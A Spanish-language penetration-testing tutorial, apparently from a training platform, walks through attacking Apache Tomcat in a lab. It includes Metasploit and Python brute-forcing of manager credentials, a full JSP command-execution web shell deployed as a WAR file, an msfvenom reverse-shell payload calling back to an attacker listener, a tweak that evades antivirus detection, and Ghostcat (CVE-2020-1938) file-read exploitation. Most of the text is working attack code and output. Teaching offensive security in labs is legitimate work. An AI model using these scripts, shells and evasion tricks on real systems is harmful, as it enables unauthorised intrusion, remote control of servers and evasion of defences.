# Attacking Tomcat

Hemos identificado que de hecho hay un host de Tomcat expuesto externamente por nuestro cliente. Como el alcance de la evaluación es relativamente pequeño y todos los demás objetivos no son particularmente interesantes, pasemos toda nuestra atención a intentar obtener acceso interno a través de Tomcat.

Como se discutió en la sección anterior, si podemos acceder al`/manager`o`/host-manager`Puntos finales, es probable que podamos lograr la ejecución de código remoto en el servidor TomCat. Comencemos por la página del Administrador de Tomcat en la instancia de Tomcat en`http://web01.inlanefreight.local:8180`. Podemos usar el[auxiliar/escáner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)Módulo MetaSploit para estos fines, Burp Suite Intruder o cualquier número de scripts para lograr esto. Usaremos MetaSploit para nuestros propósitos.

---

# **Gerente de Tomcat - Fuerza Bruta de inicio de sesión**

Primero tenemos que establecer algunas opciones. Nuevamente, debemos especificar el VHOST y la dirección IP del objetivo para interactuar correctamente con el objetivo. También debemos establecer`STOP_ON_SUCCESS`a`true`Por lo tanto, el escáner se detiene cuando obtenemos un inicio de sesión exitoso, no sirve de nada para generar cargas de solicitudes adicionales después de un inicio de sesión exitoso.

Atacando a Tomcat

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58

```

Como siempre, verificamos para asegurarnos de que todo esté configurado correctamente por`show options`.

Atacando a Tomcat

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8180                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host

```

Golpeamos`run`y obtener un éxito para el par de credenciales`tomcat:admin`.

Atacando a Tomcat

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Es importante tener en cuenta que hay muchas herramientas disponibles para nosotros como probadores de penetración. Muchos existen para hacer que nuestro trabajo sea más eficiente, especialmente porque la mayoría de las pruebas de penetración son "en el tiempo" o bajo restricciones de tiempo estrictas. Ninguna herramienta es mejor que otra, y no nos convierte en un probador de penetración "malo" si usamos ciertas herramientas como MetaSploit para nuestra ventaja. Siempre que entendemos que cada escáner y script de explotación que ejecutamos y los riesgos, entonces utilizar este escáner correctamente no es diferente del uso de Burp Intruder o escribir un script de Python personalizado. Algunos dicen: "Trabaja más inteligente, no más duro". ¿Por qué haríamos un trabajo adicional para nosotros durante una evaluación de 40 horas con 1,500 hosts en el alcance cuando podemos usar una herramienta en particular para ayudarnos? Es vital para nosotros entender`how`Nuestras herramientas funcionan y cómo hacer muchas cosas manualmente. Podríamos probar manualmente cada par de credenciales en el navegador o script esto usando`cURL`o Python si lo deseamos. Por lo menos, si decidimos usar una determinada herramienta, deberíamos poder explicar su uso y su impacto potencial para nuestros clientes si nos cuestionan durante o después de la evaluación.

Supongamos que un módulo de metasploit particular (u otra herramienta) está fallando o no comportándose como creemos que debería. Siempre podemos usar BURP Suite o ZAP para representar el tráfico y la solución de problemas. Para hacer esto, primero, enciende Burp Suite y luego establece el`PROXIES`Opción como la siguiente:

Atacando a Tomcat

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080

msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)

```

Podemos ver en Burp exactamente cómo funciona el escáner, teniendo en cuenta cada par de credenciales y codificando base64 para la autenticación básica que usa Tomcat.

![](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Una verificación rápida del valor en el`Authorization`El encabezado para una solicitud muestra que el escáner se está ejecutando correctamente, Base64 codificando las credenciales`admin:vagrant`La forma en que lo haría la aplicación Tomcat cuando un usuario intenta iniciar sesión directamente desde la aplicación web. Pruebe esto para obtener algunos ejemplos a lo largo de este módulo para comenzar a sentirse cómodo con la depuración a través de un proxy.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -dadmin:vagrant

```

También podemos usar[este](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)Script Python para lograr el mismo resultado.

Código:pitón

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code

```

Este es un guión muy sencillo que toma algunos argumentos. Podemos ejecutar el script con`-h`para ver lo que requiere ejecutar.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ python3 mgr_brute.py  -husage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS

Tomcat manager or host-manager credential bruteforcing

optional arguments:
  -h, --help            show this help message and exit
  -U URL, --url URL     URL to tomcat page
  -P PATH, --path PATH  manager or host-manager URI
  -u USERNAMES, --usernames USERNAMES
                        Users File
  -p PASSWORDS, --passwords PASSWORDS
                        Passwords Files

```

Podemos probar el script con el archivo predeterminado de usuarios y contraseñas de Tomcat que usa el módulo de metasploit anterior. ¡Lo ejecutamos y recibimos un golpe!

Atacando a Tomcat

```
xnoxos@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'

```

Si está interesado en las secuencias de comandos, consulte los módulos[Introducción a Python 3](https://academy.hackthebox.com/course/preview/introduction-to-python-3)y[Introducción a las secuencias de comandos Bash](https://academy.hackthebox.com/course/preview/introduction-to-bash-scripting). Un ejercicio ordenado sería crear nuestros propios scripts de inicio de sesión de la fuerza brute-force de Tomcat usando Python y Bash, pero dejaremos ese ejercicio para usted.

---

# **Tomcat Manager - Carga del archivo de guerra**

Muchas instalaciones de Tomcat proporcionan una interfaz GUI para administrar la aplicación. Esta interfaz está disponible en`/manager/html`de forma predeterminada, que solo los usuarios asignaron el`manager-gui`El rol puede acceder. Las credenciales de gerente válidas se pueden usar para cargar una aplicación Tomcat empaquetada (archivo .war) y comprometer la aplicación. Se utiliza una guerra, o archivo de aplicaciones web, para implementar rápidamente aplicaciones web y almacenamiento de copias de seguridad.

Después de realizar un ataque de fuerza bruta y responder las preguntas 1 y 2 a continuación, navegue por`http://web01.inlanefreight.local:8180/manager/html`e ingrese las credenciales.

![](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)

La aplicación Web Manager nos permite implementar instantáneamente nuevas aplicaciones cargando archivos de guerra. Se puede crear un archivo de guerra utilizando la utilidad ZIP. Un shell web JSP como[este](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)se puede descargar y colocar dentro del archivo.

Código:Java

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre><%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
%>
</pre>
</BODY></HTML>

```

Atacando a Tomcat

```
xnoxos@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jspxnoxos@htb[/htb]$ zip -r backup.war cmd.jsp   adding: cmd.jsp (deflated 81%)

```

Hacer clic en`Browse`Para seleccionar el archivo .war y luego haga clic en`Deploy`.

![](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Este archivo se carga a la GUI del administrador, después de lo cual el`/backup`La aplicación se agregará a la tabla.

![](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

Si hacemos clic en`backup`, seremos redirigidos a`http://web01.inlanefreight.local:8180/backup/`Y consigue un`404 Not Found`error. Necesitamos especificar el`cmd.jsp`Archivo en la URL también. Navegar por`http://web01.inlanefreight.local:8180/backup/cmd.jsp`Nos presentará un shell web que podemos usar para ejecutar comandos en el servidor Tomcat. Desde aquí, podríamos actualizar nuestro shell web a un shell inverso interactivo y continuar. Como ejemplos anteriores, podemos interactuar con este shell web a través del navegador o usar`cURL`en la línea de comando. ¡Prueba ambos!

Atacando a Tomcat

```
xnoxos@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>

```

Para limpiarnos después de nosotros, podemos volver a la página principal del administrador de Tomcat y hacer clic en el`Undeploy`botón al lado del`backups`Aplicación después, por supuesto, observando el archivo y la ubicación de carga para nuestro informe, que en nuestro ejemplo es`/opt/tomcat/apache-tomcat-10.0.10/webapps`. Si hacemos un`ls`En ese directorio desde nuestro shell web, veremos el cargado`backup.war`archivo y el`backup`directorio que contiene el`cmd.jsp`guión y`META-INF`creado después de que la aplicación se implementa. Haciendo clic en`Undeploy`Por lo general, eliminará el archivo de guerra cargado y el directorio asociado con la aplicación.

También podríamos usar`msfvenom`para generar un archivo de guerra malicioso. La carga útil[java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb)ejecutará un shell inverso a través de un archivo JSP. Explore la consola Tomcat e implementa este archivo. Tomcat extrae automáticamente el contenido del archivo de guerra y lo implementa.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.warPayload size: 1098 bytes
Final size of war file: 1098 bytes

```

Inicie un oyente de NetCat y haga clic en`/backup`para ejecutar el shell.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ nc -lnvp 4443listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224

id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

```

El[multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)El módulo MetaSploit se puede usar para automatizar el proceso que se muestra arriba, pero dejaremos esto como un ejercicio para el lector.

[Este](https://github.com/SecurityRiskAdvisors/cmd.jsp)JSP Web Shell es muy liviano (menos de 1 kb) y utiliza un[Marcador](https://www.freecodecamp.org/news/what-are-bookmarklets/)o Marcador de navegador para ejecutar el JavaScript necesario para la funcionalidad del shell web y la interfaz de usuario. Sin él, navegando a un cargado`cmd.jsp`No dejaría nada. Esta es una excelente opción para minimizar nuestra huella y posiblemente evadir las detecciones para los shsh estándar de la web JSP (aunque el código JSP puede necesitar modificarse un poco).

El shell web, tal como es, solo es detectado por 2/58 proveedores antivirus.

![](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un cambio simple como cambiar:

Código:Java

```java
FileOutputStream(f);stream.write(m);o="Uploaded:

```

a:

Código:Java

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:

```

resulta en 0/58 proveedores de seguridad que marcan el`cmd.jsp`Archivo como malicioso al momento de escribir.

---

# **Una nota rápida en los shells web**

Cuando cargamos shells web (especialmente en externals), queremos evitar el acceso no autorizado. Debemos tomar ciertas medidas, como un nombre de archivo aleatorizado (es decir, hash MD5), limitar el acceso a nuestra dirección IP de origen e incluso protegerlo con contraseña. No queremos que un atacante se encuentre con nuestro shell web y lo aproveche para que gane su propio punto de apoyo.

---

# **CVE-2020-1938: Ghostcat**

Se descubrió que Tomcat era vulnerable a un LFI no autenticado en un descubrimiento semi-reciente llamado[Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). Todas las versiones de Tomcat antes de las 9.0.31, 8.5.51 y 7.0.100 se encontraron vulnerables. Esta vulnerabilidad fue causada por una configuración errónea en el protocolo AJP utilizado por Tomcat. AJP significa Protocolo Apache JServ, que es un protocolo binario utilizado para las solicitudes de proxy. Esto se usa típicamente en solicitudes de representación a servidores de aplicaciones detrás de los servidores web front-end.

El servicio AJP generalmente se ejecuta en el puerto 8009 en un servidor Tomcat. Esto se puede verificar con un escaneo NMAP dirigido.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.localStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds

```

El escaneo anterior confirma que los puertos 8080 y 8009 están abiertos. Se puede encontrar el código POC para la vulnerabilidad[aquí](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Descargue el script y guárdelo localmente. El exploit solo puede leer archivos y carpetas dentro de la carpeta de aplicaciones web, lo que significa que archivos como`/etc/passwd`No se puede acceder. Intentemos acceder a Web.xml.

Atacando a Tomcat

```
xnoxos@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>

```

En algunas instalaciones de Tomcat, podemos acceder a datos confidenciales dentro del archivo Web-INF.

---

# **Avanzar**

Tomcat siempre es un gran hallazgo en las pruebas de penetración interna y externa. Cada vez que lo encontramos, debemos probar el área de Tomcat Manager para obtener credenciales débiles/predeterminadas. Si podemos iniciar sesión, podemos convertir rápidamente este acceso en ejecución de código remoto. Es común encontrar a Tomcat que se ejecuta como usuarios de alta privilegio como el sistema o la raíz, por lo que siempre vale la pena cavar, ya que podría proporcionarnos una posición privilegiada en un servidor de Linux o en un servidor de Windows unido por dominio en un entorno de Active Directory.